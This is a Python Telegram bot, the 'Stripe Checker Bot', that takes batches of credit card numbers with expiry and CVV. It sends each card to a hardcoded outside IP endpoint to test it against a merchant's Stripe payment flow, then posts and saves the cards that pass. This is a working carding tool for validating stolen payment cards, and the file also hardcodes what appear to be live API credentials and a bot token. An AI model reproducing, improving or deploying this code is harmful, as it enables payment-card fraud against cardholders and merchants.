from telethon import TelegramClient, events
import json, os, re, asyncio, datetime
import aiohttp
import aiofiles

# ================== CONFIG ==================
API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

ADMIN_ID = [7077294261]

PREMIUM_FILE = "premium.json"
BANNED_FILE = "banned_users.json"
CC_FILE = "approved.txt"

# ================== STRIPE CHECKER ==================
async def check_stripe(card: str, site: str = "redbluechair.com"):
    try:
        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}&site={site}"
        timeout = aiohttp.ClientTimeout(total=50)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url) as res:
                if res.status != 200:
                    return {"Response": f"HTTP {res.status}", "Status": "Declined"}
                
                data = await res.json()
                response_text = data.get("Response", str(data))
                
                if isinstance(response_text, str) and response_text.startswith("{"):
                    try:
                        rj = json.loads(response_text)
                        response_text = rj.get("data", {}).get("error", {}).get("message", response_text)
                    except:
                        pass
                
                lower = str(response_text).lower()
                status = "Approved" if any(x in lower for x in ["approved", "success", "insufficient_funds"]) else "Declined"
                
                return {"Response": str(response_text)[:300], "Status": status}
    except Exception as e:
        return {"Response": f"Error: {str(e)[:100]}", "Status": "Declined"}


# ================== UTILITIES ==================
async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            content = await f.read().strip()
            return json.loads(content) if content else {}
    except:
        async with aiofiles.open(filename, "w") as f:
            await f.write(json.dumps({}))
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium_user(user_id):
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data:
        return False
    try:
        expiry = datetime.datetime.fromisoformat(data[uid]['expiry'])
        return datetime.datetime.now() <= expiry
    except:
        return False

async def is_banned_user(user_id):
    data = await load_json(BANNED_FILE)
    return str(user_id) in data

async def save_approved(card, response):
    async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
        await f.write(f"{card} | APPROVED | {response}\n")


# ================== BOT ==================
client = TelegramClient('stripe_bot', API_ID, API_HASH)

@client.on(events.NewMessage(pattern=r'(?i)^[/.](start|help)$'))
async def start(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 You are banned!")
    await event.reply("**🔥 Stripe Checker Bot**\nUse `/mst` + cards\nExample: `/mst 5443170628782539|06|30|222`")

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst'))
async def mst(event):
    if await is_banned_user(event.sender_id):
        return await event.reply("🚫 Banned!")
    
    if event.is_private and not await is_premium_user(event.sender_id):
        return await event.reply("Premium required in PM.")

    # === DEBUG ===
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        text = reply.text or ""
        debug_msg = await event.reply("🔍 Debug: Using replied message")
    else:
        text = event.raw_text
        debug_msg = await event.reply("🔍 Debug: Using command text")

    print(f"[DEBUG] Raw text: {text}")

    # Stronger regex
    cards = re.findall(r'\d{15,16}\s*\|\s*\d{1,2}\s*\|\s*\d{2,4}\s*\|\s*\d{3,4}', text)
    cards = [re.sub(r'\s+', '', c) for c in cards]   # Remove spaces

    print(f"[DEBUG] Found {len(cards)} cards: {cards}")

    if not cards:
        return await event.reply("❌ No valid cards found!\n\nCorrect format:\n`5443170628782539|06|30|222`")

    cards = cards[:80]
    await event.reply(f"✅ Starting check on **{len(cards)}** cards...")
    asyncio.create_task(process_mass(event, cards))


async def process_mass(event, cards):
    total = len(cards)
    checked = approved = 0
    status_msg = await event.reply(f"🔥 Checking **{total}** cards...")

    for i in range(0, len(cards), 8):
        batch = cards[i:i+8]
        tasks = [check_stripe(card) for card in batch]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for card, res in zip(batch, results):
            if isinstance(res, Exception):
                res = {"Response": "Error", "Status": "Declined"}
            
            checked += 1
            if res.get("Status") == "Approved":
                approved += 1
                await save_approved(card, res.get("Response"))
                await event.reply(f"💎 **APPROVED**\n`{card}`\n{res.get('Response')}")

            try:
                await status_msg.edit(f"**Progress**\n✅ Approved: **{approved}**\n🔄 Checked: **{checked}/{total}**")
            except:
                pass

            await asyncio.sleep(1.2)

    await status_msg.edit(f"✅ **Finished!**\nApproved: **{approved}/{total}**")


# ================== RUN ==================
async def main():
    print("🚀 Stripe Bot Started | redbluechair.com")
    await client.start(bot_token=BOT_TOKEN)
    await client.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())
